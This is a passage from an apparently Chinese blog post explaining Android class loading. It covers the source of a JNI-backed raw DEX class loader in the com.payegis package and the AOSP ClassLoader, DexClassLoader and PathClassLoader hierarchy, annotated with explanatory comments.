class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;path.separator&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileSep</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;file.separator&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (mRawLibPath != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (pathList.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                pathList += pathSep + mRawLibPath;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                pathList = mRawLibPath;<br>            &#125;<br>        &#125;<br><br>        mLibPaths = pathList.split(pathSep);<br><br>        <span class="hljs-comment">// Add a &#x27;/&#x27; to the end so we don&#x27;t have to do the property lookup</span><br>        <span class="hljs-comment">// and concatenation later.</span><br>        <span class="hljs-comment">//用路径分隔符分割路径列表字符串，生成路径数组。</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mLibPaths.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (!mLibPaths[i].endsWith(fileSep)) &#123;<br>                mLibPaths[i] += fileSep;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure>



<p>RawDexClassLoader&#x2F;src&#x2F;com&#x2F;payegis&#x2F;<strong>RawDexFile.java</strong></p>
<p>JNI（Java Native Interface）与本地代码交互以处理DEX文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.payegis;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RawDexFile</span> &#123;  <span class="hljs-comment">//定义了一个公开的类RawDexFile</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mCookie;<br>    <span class="hljs-keyword">private</span> String mDexName;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">RawDexFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span> &#123;<br>        mCookie = openRawDexFile(rawDex, dexName, <span class="hljs-number">0</span>);<br>        mDexName = dexName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">loadClass</span><span class="hljs-params">(String name, ClassLoader loader)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">slashName</span> <span class="hljs-operator">=</span> name.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>        <span class="hljs-keyword">return</span> loadClassBinaryName(slashName, loader);<br>    &#125;<br><br>  <span class="hljs-comment">//  调用loadClassBinaryName方法并返回结果。</span><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">loadClassBinaryName</span><span class="hljs-params">(String name, ClassLoader loader)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(name, loader, mCookie);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">public</span> RawDexFile <span class="hljs-title function_">loadDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawDexFile</span>(rawDex, dexName, flags);<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(String name, ClassLoader loader, <span class="hljs-type">long</span> cookie)</span> &#123;  <span class="hljs-comment">//定义类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            result = defineClassNative(name, loader, cookie);   <span class="hljs-comment">//尝试调用本地方法defineClassNative来定义类，并捕获异常。</span><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoClassDefFoundError e) &#123;<br>            <span class="hljs-comment">// TODO Auto-generated catch block</span><br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        closeDexFile(mCookie);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String[] getLoadedClassName()<br>    &#123;<br>        <span class="hljs-keyword">return</span> getClassNameList(mCookie);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;egis&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">//因为有几个本地方法（native methods）的声明。本地方法是用native关键字标识的，表示它们不是用Java实现的，而是用其他语言（通常是C或C++）实现的，并通过JNI与Java代码交互。在RawDexFile类中，如openRawDexFile、closeDexFile、defineClassNative和getClassNameList方法都是本地方法。</span><br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-type">long</span> <span class="hljs-title function_">openRawDexFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span>;  <span class="hljs-comment">//声明本地方法openRawDexFile。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">closeDexFile</span><span class="hljs-params">(<span class="hljs-type">long</span> cookie)</span>;  <span class="hljs-comment">//公开方法close，用于关闭DEX文件。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClassNative(String name, ClassLoader loader, <span class="hljs-type">long</span> cookie)<br>            <span class="hljs-keyword">throws</span> ClassNotFoundException, NoClassDefFoundError;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String[] getClassNameList(<span class="hljs-type">long</span> cookie);<br>&#125;<br><br></code></pre></td></tr></table></figure>



<p>RawDexClassLoader&#x2F;src&#x2F;com&#x2F;payegis&#x2F;<strong>RawDexFile.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.payegis;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RawDexFile</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mCookie; <span class="hljs-comment">//用于存储打开DEX文件时返回的句柄或标识符。</span><br>    <span class="hljs-keyword">private</span> String mDexName; <span class="hljs-comment">//存储DEX文件的名称。</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">RawDexFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span> &#123;<br>        mCookie = openRawDexFile(rawDex, dexName, <span class="hljs-number">0</span>);  <span class="hljs-comment">//用openRawDexFile本地方法打开DEX文件，并保存返回的句柄（mCookie）和DEX文件名。</span><br>        mDexName = dexName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">loadClass</span><span class="hljs-params">(String name, ClassLoader loader)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">slashName</span> <span class="hljs-operator">=</span> name.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);  <span class="hljs-comment">//将全限定名中的点（.）替换为斜杠（/）  如果有一个类名为MainActivity，并且这个类位于com.example.myapp包中，那么这个类的全限定名就是com.example.myapp.MainActivity。</span><br>        <span class="hljs-keyword">return</span> loadClassBinaryName(slashName, loader);<br>    &#125;<br><br>    <span class="hljs-comment">// 加载一个类名形如com/hello/world的类  </span><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">loadClassBinaryName</span><span class="hljs-params">(String name, ClassLoader loader)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(name, loader, mCookie);  <span class="hljs-comment">//通过defineClass方法加载并返回类</span><br>    &#125;<br><br>    <span class="hljs-comment">//用于创建RawDexFile实例。这是外部代码使用这个类的主要入口点。</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">public</span> RawDexFile <span class="hljs-title function_">loadDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawDexFile</span>(rawDex, dexName, flags);<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(String name, ClassLoader loader, <span class="hljs-type">long</span> cookie)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            result = defineClassNative(name, loader, cookie);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoClassDefFoundError e) &#123;<br>            <span class="hljs-comment">// TODO Auto-generated catch block</span><br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        closeDexFile(mCookie);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String[] getLoadedClassName()<br>    &#123;<br>        <span class="hljs-keyword">return</span> getClassNameList(mCookie); <span class="hljs-comment">//返回一个字符串数组，包含通过这个RawDexFile实例加载的所有类的名称。</span><br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;egis&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-type">long</span> <span class="hljs-title function_">openRawDexFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">closeDexFile</span><span class="hljs-params">(<span class="hljs-type">long</span> cookie)</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClassNative(String name, ClassLoader loader, <span class="hljs-type">long</span> cookie)<br>            <span class="hljs-keyword">throws</span> ClassNotFoundException, NoClassDefFoundError;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String[] getClassNameList(<span class="hljs-type">long</span> cookie);<br>&#125;<br><br></code></pre></td></tr></table></figure>



<hr>
<h5 id="android-ClassLoader"><a href="#android-ClassLoader" class="headerlink" title="android-ClassLoader"></a>android-ClassLoader</h5><p>Android和java中的ClassLoader可以说不是同一个东西，java中可执行文件为class，而android为dex</p>
<p>Android中的classloader</p>
<ul>
<li>系统类加载器：BootClassLoader、PathClassLoader、DexClassLoader。</li>
<li>自定义加载器：即继承自系统的类加载器。</li>
</ul>
<h6 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> ClassLoader parent;  <span class="hljs-comment">//记录父类加载器</span><br>	<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Void <span class="hljs-title function_">checkCreateClassLoader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ClassLoader</span><span class="hljs-params">(Void unused, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.parent = parent;<br>    &#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">ClassLoader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>(checkCreateClassLoader(), getSystemClassLoader());<br>    &#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">ClassLoader</span><span class="hljs-params">(ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">this</span>(checkCreateClassLoader(), parent);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>

<p>ClassLoader是一个抽象类，在构造方法中调用了<code>getSystemClassLoader()</code>方法，获取SystemClassLoader，它的代码同样在ClassLoader类中，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>	<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SystemClassLoader</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> ClassLoader.createSystemClassLoader();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ClassLoader <span class="hljs-title function_">getSystemClassLoader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> SystemClassLoader.loader;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ClassLoader <span class="hljs-title function_">createSystemClassLoader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">librarySearchPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PathClassLoader</span>(classPath, librarySearchPath, BootClassLoader.getInstance());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可见SystemClassLoader对应的是PathClassLoader。</p>
<p>从ClassLoader的代码中可以看出，每创建一个ClassLoader实例，都需要一个现有的ClassLoader实例作为新创建的实例的Parent，这样一来，所有的ClassLoader之间的关联就像一棵树一样，这也是ClassLoader的 双亲代理模型的特点。</p>
<h6 id="BootClassLoader"><a href="#BootClassLoader" class="headerlink" title="BootClassLoader"></a><strong>BootClassLoader</strong></h6><p>Android系统启动时会使用BootClassLoader来预加载常用类，它由Java实现，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BootClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> BootClassLoader instance;<br><br>    <span class="hljs-meta">@FindBugsSuppressWarnings(&quot;DP_CREATE_CLASSLOADER_INSIDE_DO_PRIVILEGED&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> BootClassLoader <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BootClassLoader</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>BootClassLoader是ClassLoader的内部类，并继承自ClassLoader。由于BootClassLoader的权限声明是默认的，只有在同一包中才能访问，因此我们在应用程序中是无法直接调用的。</p>
<h6 id="BaseDexClassLoader"><a href="#BaseDexClassLoader" class="headerlink" title="BaseDexClassLoader"></a><strong>BaseDexClassLoader</strong></h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseDexClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DexPathList pathList;  <span class="hljs-comment">//记录dex文件路径信息</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BaseDexClassLoader</span><span class="hljs-params">(String dexPath, File optimizedDirectory, String libraryPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        <span class="hljs-built_in">this</span>.pathList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexPathList</span>(<span class="hljs-built_in">this</span>, dexPath, libraryPath, optimizedDirectory);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>BaseDexClassLoader继承自ClassLoader，在构造方法中初始化了DexPathList对象，这个对象比较关键，后续会讲解到。</p>
<h6 id="DexClassLoader"><a href="#DexClassLoader" class="headerlink" title="DexClassLoader"></a><strong>DexClassLoader</strong></h6><p>DexClassLoader是用来加载dex文件以及包含dex文件的压缩包（apk、jar）。它的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DexClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseDexClassLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DexClassLoader</span><span class="hljs-params">(String dexPath, String optimizedDirectory,</span><br><span class="hljs-params">            String librarySearchPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(dexPath, <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(optimizedDirectory), librarySearchPath, parent);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>参数解析如下：</p>
<ul>
<li><code>dexPath</code>：dex文件或包含dex文件的jar&#x2F;apk文件的路径集合，多个路径用文件分隔符分隔，默认文件分隔符为”:”。</li>
<li><code>optimizedDirectory</code>：dex优化后产生的文件所存放的路径。</li>
<li><code>librarySearchPath</code>：native库的路径集合，多个路径用文件分隔符分隔。</li>
<li><code>parent</code>：父加载器</li>
</ul>
<p>DexClassLoader继承自BaseDexClassLoader，它的方法均在BaseDexClassLoader中实现。DexClassLoader通常用来加载已安装的jar、apk、dex以及SD卡中加载未安装的apk。</p>
<h6 id="PathClassLoader"><a href="#PathClassLoader" class="headerlink" title="PathClassLoader"></a><strong>PathClassLoader</strong></h6><p>Android系统使用PathClassLoader来加载系统类和应用程序的类，它的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/PathClassLoader.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PathClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseDexClassLoader</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PathClassLoader</span><span class="hljs-params">(String dexPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(dexPath, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, parent);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PathClassLoader</span><span class="hljs-params">(String dexPath, String librarySearchPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(dexPath, <span class="hljs-literal">null</span>, librarySearchPath, parent);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>同DexClassLoader一样，PathClassLoader继承自BaseDexClassLoader，方法也都在父类中实现。</p>
<p>可以注意到，PathClassLoader的构造方法中都没有optimizedDirectory参数，这是因为PathClassLoader中默认optimizedDirectory的值为<code>/data/dalvik-cache</code>（是的，默认dex优化文件的存放目录），因此PathClassLoader是用来加载系统中已经安装过的apk的dex文件。</p>
<p>ClassLoader的继承关系</p>
<ul>
<li>ClassLoader：抽象类，定义了classloader的主要功能。</li>
<li>BootClassLoader：classloader的内部类，并继承自classloader。</li>
<li>SecureClassLoader：继承自ClassLoader，拓展了ClassLoader类的权限方面的功能。</li>
<li>URLClassLoader：继承来自SecureClassLoader，用来通过URL路劲从jar文件和文件夹加载类和资源。</li>
<li>BaseDexClassLoader：继承ClassLoader，是抽象类ClassLoader的具体实现类。</li>
<li>InMemoryDexClassLoader：Android8新增的类加载器，继承来自BaseDexClassLoader，用于加载内存中的dex文件。</li>
<li>PathClassLoader：继承BaseDexClassLoader，用于加载已安装的jar、apk、dex以及SD卡中加载未安装的apk。</li>
</ul>
<p>父类加载器和子类加载器之间并不是继承关系，而是使用组合关系赖调用父类加载器，即创建类加载器时传入的parent参数</p>
<p>对应ClassLoader中的核心代码<code>loadClass()</code>如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-type">boolean</span> resolve)<br>    <span class="hljs-keyword">throws</span> ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// 先检查是否已经加载过了该类</span><br>    Class&lt;?&gt; c = findLoadedClass(name);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (parent != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//没有加载该类，且存在父加载器，交给父加载器处理</span><br>                c = parent.loadClass(name, <span class="hljs-literal">false</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//没有加载该类，且不存在父加载器</span><br>                c = findBootstrapClassOrNull(name);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            <span class="hljs-comment">// ClassNotFoundException thrown if class not found</span><br>            <span class="hljs-comment">// from the non-null parent class loader</span><br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//父加载器处理失败，自己来找</span><br>            c = findClass(name);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-keyword">private</span> Class&lt;?&gt; findBootstrapClassOrNull(String name)<br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>ClassLoader加载类的过程</p>
<p>ClassLoader加载类的方法为loadClass(),他被定义在抽象类ClassLoader中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 